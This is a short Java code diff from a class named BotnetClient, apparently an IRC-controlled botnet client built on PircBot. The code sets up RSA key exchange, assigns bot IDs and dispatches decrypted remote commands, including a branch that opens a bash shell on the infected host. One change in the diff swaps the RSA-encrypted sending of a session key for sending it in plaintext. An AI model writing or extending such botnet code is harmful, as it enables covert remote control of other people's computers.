@@ -52,7 +52,7 @@ public class BotnetClient extends PircBot {
 	public BotnetClient() {
 		m = MsgEncrypt.getInstance();
 		m.genRSAPubKey(rsaMod + " " + rsaPublicExp);
-		System.out.println(m.getRSAPub());
+		System.out.println("public key is: " + m.getRSAPub());
 		uuid = UUID.randomUUID().toString();
 		id = NAME + "_" + uuid;
 		try {
@@ -240,7 +240,7 @@ public class BotnetClient extends PircBot {
 						String info = m.decryptRSA(chat.readLine());
 						m.setPubParams(info);
 						m.handShake(otherKey);
-						chat.sendLine(m.encryptRSA(m.getStrKey()));
+						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
 					} else if (m.decryptMsg(command).equalsIgnoreCase("shell")) {
 						//Create the bash shell
